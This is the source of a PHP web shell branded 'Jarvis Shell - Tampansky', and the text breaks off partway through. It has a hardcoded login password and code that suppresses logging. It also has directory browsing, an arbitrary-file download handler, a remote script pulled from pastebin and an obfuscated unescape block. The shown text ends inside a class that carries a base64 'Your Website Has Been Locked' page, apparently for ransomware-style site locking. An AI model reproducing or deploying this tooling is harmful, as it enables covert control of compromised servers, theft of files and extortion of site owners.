<?php
ob_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
$pass = "sky"; // Isi Password Klean ASW // 
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
header("X-XSS-Protection: 0");
ini_set('display_errors', FALSE);
ini_set("memory_limit", "2000M");
ini_set("safe_mode", "off");
$safe_mode = @ini_get('safe_mode');
if (!$safe_mode)
?>
<link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
<?php
error_reporting(0);
session_start();
$link = "s.txt";
if ($_POST['passwd'] == $pass) {
    $_SESSION['rootsky'] = $pass;
    echo "<script>window.location='?'<script>";
}
if ($_GET['page'] == "blank") {
    echo "<script>Alert('Session Log Out')</script><a href='?logout'>Back</a>";
    exit();
}

if (isset($_REQUEST['logout'])) {
    session_destroy();
    echo "<script>window.location='?'</script>";
}
if (!($_SESSION['rootsky'])) {
?>
    <style>
        @import url(https://fonts.googleapis.com/css?family=Ubuntu);
    </style>
    <?php
    echo '
        <!DOCTYPE html>
        <html lang="en">
        
        <head>
            <title>Shell Login</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link rel="icon" type="image/png" href="https://colorlib.com/etc/lf/Login_v3/images/icons/favicon.ico" />
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/bootstrap/css/bootstrap.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/fonts/iconic/css/material-design-iconic-font.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/animate/animate.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/css-hamburgers/hamburgers.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/animsition/css/animsition.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/select2/select2.min.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/vendor/daterangepicker/daterangepicker.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/css/util.css">
            <link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v3/css/main.css">
        
        </head>
        
        <body>
            <div class="limiter">
                <div class="container-login100" style="background-image: url("https://colorlib.com/etc/lf/Login_v3/images/bg-01.jpg");">
                    <div class="wrap-login100">
                        <form method="POST" class="login100-form validate-form">
                            <span class="login100-form-logo">
                                <img src="https://1.bp.blogspot.com/-syCebLggRBk/XYoVthUcpBI/AAAAAAAABF0/rejz5Ty-8BAB0y0koy1uK4yVR4roMhTDACLcBGAsYHQ/s320/a%2BPSCT%2BNEW%2BLOGO.jpg" width="150px" height="150px" style="border-radius:100px; border:red solid 3px;" readonly>
                            </span>
                            <span class="login100-form-title p-b-34 p-t-27">
                                Log in
                            </span>
                            <div class="wrap-input100 validate-input" data-validate="Enter username">
                                <input class="input100" type="text" name="username" placeholder="Username">
                                <span class="focus-input100" data-placeholder="&#xf207;"></span>
                            </div>
                            <div class="wrap-input100 validate-input" data-validate="Enter password">
                                <input class="input100" type="password" name="passwd" placeholder="Password">
                                <span class="focus-input100" data-placeholder="&#xf191;"></span>
                            </div>
                            <div class="contact100-form-checkbox">
                                <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                                <label class="label-checkbox100" for="ckb1">
                                    Remember me
                                </label>
                            </div>
                            <div class="container-login100-form-btn">
                                <button class="login100-form-btn">
                                    Login
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div id="dropDownSelect1"></div>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/jquery/jquery-3.2.1.min.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/animsition/js/animsition.min.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/bootstrap/js/popper.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/bootstrap/js/bootstrap.min.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/select2/select2.min.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/daterangepicker/moment.min.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/daterangepicker/daterangepicker.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/vendor/countdowntime/countdowntime.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script src="https://colorlib.com/etc/lf/Login_v3/js/main.js" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
        
            <script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13" type="e72cdc1a33b0ea4ef95b39ce-text/javascript"></script>
            <script type="e72cdc1a33b0ea4ef95b39ce-text/javascript">
                window.dataLayer = window.dataLayer || [];
        
                function gtag() {
                    dataLayer.push(arguments);
                }
                gtag("js", new Date());
        
                gtag("config", "UA-23581568-13");
            </script>
            <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/95c75768/cloudflare-static/rocket-loader.min.js" data-cf-settings="e72cdc1a33b0ea4ef95b39ce-|49" defer=""></script>
        </body>
        
        </html>

        ';
    ?>
    <?php echo $_SESSION['rootsky']; ?>
    </form><br>

<?php
    exit();
}
?>
<?php

$dir_raw = getcwd();
$host = $_SERVER['HTTP_HOST'];
if ($dn = $_GET['d']) {
    $_SESSION['dir'] = $dn;
    echo "<script>window.location = '?';</script>";
}
if (empty($_SESSION['dir'])) {
    $dir = $dir_raw;
} else {
    $dir = $_SESSION['dir'];
}
$exp = explode("/", $dir);
foreach ($exp as $x => $dirx) {
    if (empty($dirx)) {
        continue;
    }
    $do .= "<li class='bar'><a class='a-bar' href='?d=";
    for ($i = 0; $i <= $x; $i++) {
        $do .= $exp[$i] . "/";
    }
    $do .= "'>$dirx</a></li>\n";
}
chdir($dir);
?>
<script>
    $('#myModal').modal('show');
</script>
<?php
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if (isset($_POST['file']) && ($_POST['file'] != '') && ($_POST['opt'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
//password disin


?>

<head>
    <link href='https://1.bp.blogspot.com/-syCebLggRBk/XYoVthUcpBI/AAAAAAAABF0/rejz5Ty-8BAB0y0koy1uK4yVR4roMhTDACLcBGAsYHQ/s320/a%2BPSCT%2BNEW%2BLOGO.jpg' rel='icon' type='image/x-icon' />
    <?php
    echo '<meta name="description" content="' . $_SERVER['HTTP_HOST'] . ' ~ Tampansky Shell" />'; ?>
    <link href="https://1.bp.blogspot.com/-syCebLggRBk/XYoVthUcpBI/AAAAAAAABF0/rejz5Ty-8BAB0y0koy1uK4yVR4roMhTDACLcBGAsYHQ/s320/a%2BPSCT%2BNEW%2BLOGO.jpg" rel="ICON">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
    <script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript">
        const secondHand = document.querySelector('.jarum_detik');
        const minuteHand = document.querySelector('.jarum_menit');
        const jarum_jam = document.querySelector('.jarum_jam');

        function setDate() {
            const now = new Date();

            const seconds = now.getSeconds();
            const secondsDegrees = ((seconds / 60) * 360) + 90;
            secondHand.style.transform = `rotate(${secondsDegrees}deg)`;
            if (secondsDegrees === 90) {
                secondHand.style.transition = 'none';
            } else if (secondsDegrees >= 91) {
                secondHand.style.transition = 'all 0.05s cubic-bezier(0.1, 2.7, 0.58, 1)'
            }

            const minutes = now.getMinutes();
            const minutesDegrees = ((minutes / 60) * 360) + 90;
            minuteHand.style.transform = `rotate(${minutesDegrees}deg)`;

            const hours = now.getHours();
            const hoursDegrees = ((hours / 12) * 360) + 90;
            jarum_jam.style.transform = `rotate(${hoursDegrees}deg)`;
        }

        setInterval(setDate, 1000)
    </script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous">
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous">
    </script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">
    </script>
    <meta property="og:description" content="[+] Jarvis Shell [+]" />
    <script>
        var myVar;

        function myFunction() {
            myVar = setTimeout(showPage, 500);
        }

        function showPage() {
            document.getElementById("loader").style.display = "none";
            document.getElementById("myDiv").style.display = "block";
        }
    </script>
    <script type='text/javascript' src='http://local.adfender.com/adfender/elemhide.js'></script>
    <script>
        document.getElementById('FileSel').onchange = function() {
            document.getElementById('previews').value = this.value;
        };

        $('.btn').on('click', function() {
            var $this = $(this);
            $this.button('loading');
        });
    </script>

    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" rel="stylesheet" type="text/css">
    <script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
    <link href="https://fonts.googleapis.com/css?family=Francois+One" rel="stylesheet" />
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous" />
    <!-- My Fonts -->
    <link href="https://``fonts.googleapis.com/css?family=Fruktur|Vigad&display=swap" rel="stylesheet" />
    <!-- My Css -->
    <?php
    echo '<title>..:: ' . $_SERVER['HTTP_HOST'] . ' ~ Jarvis Shell - Tampansky ::..</title>'; ?>
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
</head>

<style>
    @import url('https://fonts.googleapis.com/css?family=Aclonica|Kameron|Knewave|Sirin+Stencil&display=swap');
    @import url('https://fonts.googleapis.com/css?family=Kaushan+Script|Mansalva|Permanent+Marker|Sancreek|Shadows+Into+Light&display=swap');
    @import url(https://fonts.googleapis.com/css?family=Ubuntu);

    *,
    body,
    html {
        background: black;
        color: red;
        font-family: "Righteous";
        cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;
    }

    img[alt*="www.000webhost.com"] {
        display: none
    }

    textarea {
        border: 1px solid #ffffff;
        width: 100%;
        height: 100%;
        padding-left: 5px;
        margin: 20px auto;
        resize: none;
        font-size: 13px;
        font-family: "Righteous";
        background: transparent;
        color: red;
    }

    header {
        color: red;
        background: black;
        text-align: center;
        font-size: 40px;
    }

    input[type="button"],
    .btn,
    input[type="submit"],
    button {
        font-family: "Righteous";
        border-radius: 40px;
        background: transparent;
        color: red;
        border: 1px solid red;
        transition: all 0.5s ease;
    }

    input[type="text"] {
        font-family: "Righteous";
        border: 1px solid red;
        background: transparent;
        color: black;
        transition: all 0.5s ease;
    }

    *::-webkit-scrollbar-track {
        -webkit-box-shadow: inset 0 0 6px red;
        border-radius: 10px;
        background-color: #000115;
    }

    *::-webkit-scrollbar {
        width: 10px;
        background-color: red;
    }

    *::-webkit-scrollbar-thumb {
        border-radius: 10px;
        -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
        background-color: red;
    }

    iframe {
        font-family: "Righteous";
        background: "black";
        color: white;
    }

    @media (min-width: 992px) {

        body {
            margin: 50px;
            padding: 45px 5px;
        }



    }

    pre {
        color: white;
        transition: all 0.5s ease;
    }

    pre:hover {
        color: white;
    }

    a {
        font-family: "Righteous";
        position: relative;
        transition: all 0.5s ease;
    }

    a:hover {
        transform: scale(0.9);
    }

    select,
    option {
        font-family: "Righteous";
        border-radius: 40px;
        color: red;
        background: transparent;
        position: relative;
        text-transform: uppercase;
        transition: all 2s ease;
        border: 1px #000000 dotted;
        -moz-border-radius: 5px;
        -webkit-border-radius: 5px;
        border-radius: 5px;
    }

    select:hover,
    option:hover {
        font-family: "Righteous";
        border: 1px white solid;
        border-radius: 40px;
        color: red;
        background: transparent;
    }

    copy {
        border-radius: 40px;
        color: red;
        background: transparent;
        text-align: Center;
        align-content: center;
    }

    #menu {
        background: transparent;
        color: white;
        float: center;
    }

    #menu a {
        padding: 4px 19px;
        margin: 0;
        background: red;
        text-decoration: none;
        letter-spacing: 2px;
        -moz-border-radius: 5px;
        -webkit-border-radius: 5px;
        -khtml-border-radius: 5px;
        border-radius: 5px;

    }

    #menu a:hover {
        background: #191919;
        border-bottom: 1px solid #333333;
        border-top: 1px solid #333333;
    }

    li {
        display: inline;
        margin: 1px;
        padding: 1px;
    }

    #menu {
        background: transparent;
        margin: 9px 3px 4px 2px;
    }

    #menu a {
        padding: 4px 19px;
        margin: 0;
        background: #222222;
        text-decoration: none;
        letter-spacing: 2px;
        -moz-border-radius: 5px;
        -webkit-border-radius: 5px;
        -khtml-border-radius: 5px;
        border-radius: 5px;

    }

    #menu a:hover {
        background: #191919;
        border-bottom: 1px solid #333333;
        border-top: 1px solid #333333;
    }

    .explore tr:hover {
        background: #181818
    }

    table tr:first-child {
        background: #191919;
        text-align: center;
        color: white;
    }

    table,
    th,
    td {
        border-collapse: collapse;
        font-family: Tahoma, Geneva, sans-serif;
        background: transparent;
        font-family: '';
        font-size: 13px;
    }

    .table_home,
    .th_home,
    .td_home,
    td,
    th {
        transition: all 0.5s ease;
        border: 1px solid gray;
    }



    th,
    td {}

    a {
        color: #ffffff;
        text-decoration: none;
    }

    a:hover {
        color: blue;
        text-decoration: underline;
    }

    b {
        color: blue;
    }

    input[type=text],
    input[type=password],
    input[type=submit] {
        background: transparent;
        color: #ffffff;
        border: 1px solid #ffffff;
        margin: 5px auto;
        padding-left: 5px;
        font-family: 'Share Tech Mono';
        font-size: 13px;
    }

    input[type=submit] {
        background: #191919;
        color: #ffffff;
        border: 1px solid #ffffff;
        margin: 5px auto;
        padding-left: 5px;
        font-family: 'Share Tech Mono';
        font-size: 13px;
        cursor: pointer;
    }

    .fa-file-code,
    .fa-folder {
        font-size: 25px;
    }

    textarea {
        border: 1px solid #ffffff;
        width: 100%;
        height: 400px;
        padding-left: 5px;
        margin: 10px auto;
        resize: none;
        background: transparent;
        color: #ffffff;
        font-family: "Righteous";
        font-size: 13px;
    }

    select {
        background: #000000;
        color: blue;
        border: 1px solid #ffffff;
        font-family: "Righteous";
    }

    option:hover {
        background: blue;
        color: #000000;
        font-family: "Righteous";
    }

    .mybox {
        -moz-border-radius: 10px;
        border-radius: 10px;
        font-family: "Righteous";
        border: 1px solid #ff0000;
        padding: 4px 2px;
        width: 70%;
        line-height: 24px;
        background: none;
        box-shadow: 0px 4px 2px white;
        -webkit-box-shadow: 0px 4px 2px #ff0000;
        -moz-box-shadow: 0px 4px 2px #ff0000;
    }

    .cgx2 {
        text-align: center;
        letter-spacing: 1px;
        font-family: "Righteous";
        color: #ff0000;
        font-size: 25px;

        text-shadow: 5px 5px 5px black;
    }

    .infoweb {
        font-family: "Righteous";
        border-right: 1px solid #00FFFF;
    }

    .fa-file {
        font-size: 25px;
        font-family: "Righteous";
    }

    /* Center the loader */

    #loader {

        position: absolute;

        left: 50%;

        top: 50%;

        z-index: 1;

        width: 150px;

        height: 150px;

        margin: -75px 0 0 -75px;

        border: 16px solid #f3f3f3;

        border-radius: 50%;

        border-top: 15px solid red;

        width: 120px;

        height: 120px;

        -webkit-animation: spin 2s linear infinite;

        animation: spin 2s linear infinite;

    }

    .su {
        font-size: 15px;
    }

    #content {
        float: inline-end
    }

    @media (min-width: 576px) {
        #content {
            float: inherit;
        }

    }

    .fas,
    .fa {
        background: transparent;
    }

    @-webkit-keyframes spin {

        0% {
            -webkit-transform: rotate(0deg);
        }

        100% {
            -webkit-transform: rotate(360deg);
        }

    }



    @keyframes spin {

        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }

    }



    /* Add animation to "page content" */

    .animate-bottom {

        position: relative;

        -webkit-animation-name: animatebottom;

        -webkit-animation-duration: 1s;

        animation-name: animatebottom;

        animation-duration: 1s
    }



    @-webkit-keyframes animatebottom {

        from {
            bottom: -100px;
            opacity: 0
        }

        to {
            bottom: 0px;
            opacity: 1
        }

    }



    @keyframes animatebottom {

        from {
            bottom: -100px;
            opacity: 0
        }

        to {
            bottom: 0;
            opacity: 1
        }

    }



    #myDiv {

        display: none;
    }

    /*loader*/
    .loader,
    .loader:before,
    .loader:after {
        background: white;
        -webkit-animation: load1 1s infinite ease-in-out;
        animation: load1 1s infinite ease-in-out;
        width: 1em;
        height: 4em;
    }

    .loader:before,
    .loader:after {
        position: absolute;
        top: 0;
        content: '';
    }

    .loader:before {
        left: -1.5em;
        -webkit-animation-delay: -0.32s;
        animation-delay: -0.32s;
    }

    .loader {
        text-indent: -9999em;
        margin: 88px auto;
        position: relative;
        font-size: 11px;
        -webkit-transform: translateZ(0);
        -ms-transform: translateZ(0);
        transform: translateZ(0);
        -webkit-animation-delay: -0.16s;
        animation-delay: -0.16s;
    }

    .loader:after {
        left: 1.5em;
    }

    @-webkit-keyframes load1 {

        0%,
        80%,
        100% {
            box-shadow: 0 0 red;
            height: 4em;
        }

        40% {
            box-shadow: 0 -2em red;
            height: 5em;
        }
    }

    @keyframes load1 {

        0%,
        80%,
        100% {
            box-shadow: 0 0 red;
            height: 4em;
        }

        40% {
            box-shadow: 0 -2em red;
            height: 5em;
        }
    }

    /*akhir loader*/
    .asu a {
        text-decoration: none;
    }
</style>
<script type="text/javascript">
    <!-- HTML Encryption provided by www.psctoffic.ml //--!>
    document.write(unescape(
        '%3c%73%63%72%69%70%74%3e%0d%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%72%75%6e%43%68%61%72%43%6f%64%65%41%74%28%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%68%61%72%43%6f%64%65%41%74%2e%69%6e%70%75%74%2e%76%61%6c%75%65%3b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%70%75%74%20%3d%20%22%22%3b%0d%0a%20%20%20%20%20%20%20%20%66%6f%72%20%28%69%20%3d%20%30%3b%20%69%20%3c%20%69%6e%70%75%74%2e%6c%65%6e%67%74%68%3b%20%2b%2b%69%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6f%75%74%70%75%74%20%21%3d%20%22%22%29%20%6f%75%74%70%75%74%20%2b%3d%20%22%2c%20%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%70%75%74%20%2b%3d%20%69%6e%70%75%74%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%64%6f%63%75%6d%65%6e%74%2e%63%68%61%72%43%6f%64%65%41%74%2e%6f%75%74%70%75%74%2e%76%61%6c%75%65%20%3d%20%6f%75%74%70%75%74%3b%0d%0a%20%20%20%20%7d%0d%0a%3c%2f%73%63%72%69%70%74%3e'
    ));
    //
    -->
</script>

<body>
    <?php
    error_reporting(0);
    set_time_limit(0);
    ini_set('memory_limit', '-1');

    class skyw4r3_rsw
    {
        public $msg = "PHRpdGxlPllvdXIgV2Vic2l0ZSBIYXMgQmVlbiBMb2NrZWQ8L3RpdGxlPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9mcmVlcG5naW1nLmNvbS90aHVtYi9wYWRsb2NrLzEwLTItcGFkbG9jay1oaWdoLXF1YWxpdHktcG5nLnBuZyI+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1BbGFkaW4nIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayBocmVmPSJodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1GcmVkZXJpY2thK3RoZStHcmVhdCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+CjxsaW5rIGhyZWY9J2h0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU9yYml0cm9uOjcwMCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+CjxzdHlsZT4KICAgIGlucHV0IHsKICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7CiAgICB9Cjwvc3R5bGU+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCjxoZWFkPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzFBMUMxRjsKICAgICAgICAgICAgY29sb3I6ICNlMmUyZTI7CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgY29sb3I6IGdyZWVuOwogICAgICAgIH0KCiAgICAgICAgYS50eXBlMTpsaW5rIHsKICAgICAgICAgICAgY29sb3I6IGJsYWNrOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgfQoKICAgICAgICBhLnR5cGUxOnZpc2l0ZWQgewogICAgICAgICAgICBjb2xvcjogZ3JleTsKICAgICAgICB9CgogICAgICAgIGEudHlwZTE6aG92ZXIgewogICAgICAgICAgICAtd2Via2l0LWJhY2tncm91bmQtY2xpcDogdGV4dDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICAtd2Via2l0LXRleHQtZmlsbC1jb2xvcjogdHJhbnNwYXJlbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IC13ZWJraXQtZ3JhZGllbnQobGluZWFyLCBsZWZ0IHRvcCwgcmlnaHQgdG9wLCBmcm9tKCNlYTg3MTEpLCB0bygjZDk2MzYzKSk7CiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IC13ZWJraXQtbGluZWFyLWdyYWRpZW50KGxlZnQsICNlYTg3MTEsICNkOTYzNjMsICM3M2E2ZGYsICM5MDg1ZmIsICM1MmNhNzkpOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudChsZWZ0LCAjZWE4NzExLCAjZDk2MzYzLCAjNzNhNmRmLCAjOTA4NWZiLCAjNTJjYTc5KTsKICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogLW1zLWxpbmVhci1ncmFkaWVudChsZWZ0LCAjZWE4NzExLCAjZDk2MzYzLCAjNzNhNmRmLCAjOTA4NWZiLCAjNTJjYTc5KTsKICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KGxlZnQsICNlYTg3MTEsICNkOTYzNjMsICM3M2E2ZGYsICM5MDg1ZmIsICM1MmNhNzkpOwogICAgICAgIH0KCiAgICAgICAgLmltZyB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogN3B4OwogICAgICAgIH0KCiAgICAgICAgaDEgewogICAgICAgICAgICBmb250LWZhbWlseTogT3JiaXRyb247CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjBweDsKICAgICAgICAgICAgY29sb3I6ICMxYWJjOWM7CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHk+CiAgICA8Y2VudGVyPgogICAgICAgIDxwcmU+Cjxmb250IGNsYXNzPSJpbWciIGNvbG9yPSJyZWQiPgogICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIMK2wrbCtsK2wrbCtiAgICAgICAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICDCtsK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgwrbCtsK2wrYgICAgICAgICAgICAgIAogICAgICAgICAgICAgwrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgICAgCiAgICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgICAgICAgICAgIAogICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgIAogICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAKICAgICAgICAgIMK2wrYgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgIAogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtiAgICAgICAgICAKICAgICAgICAgIMK2wrYgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgwrYgICAgICAgICAgCiAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgwrbCtiAgICAgICAgICAKICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgICAgIAogICAgICAgICAgIMK2wrYgwrbCtiAgIMK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrYgICDCtsK2IMK2wrYgICAgICAgICAgIAogICAgICAgICAgICDCtsK2wrbCtiDCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtsK2wrYgwrbCtsK2wrbCtiAgICAgICAgICAgCiAgICAgICAgICAgICDCtsK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrbCtiAgICAgICAgICAgICAKICAgIMK2wrbCtiAgICAgICDCtsK2ICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgwrbCtiAgICAgIMK2wrbCtsK2ICAgCiAgIMK2wrbCtsK2wrYgICAgIMK2wrYgICDCtsK2wrbCtsK2wrbCtiAgIMK2wrbCtiAgIMK2wrbCtsK2wrbCtsK2ICAgwrbCtiAgICAgwrbCtsK2wrbCtsK2ICAKICDCtsK2ICAgwrbCtiAgICDCtsK2ICAgICDCtsK2wrYgICAgwrbCtsK2wrbCtiAgICDCtsK2w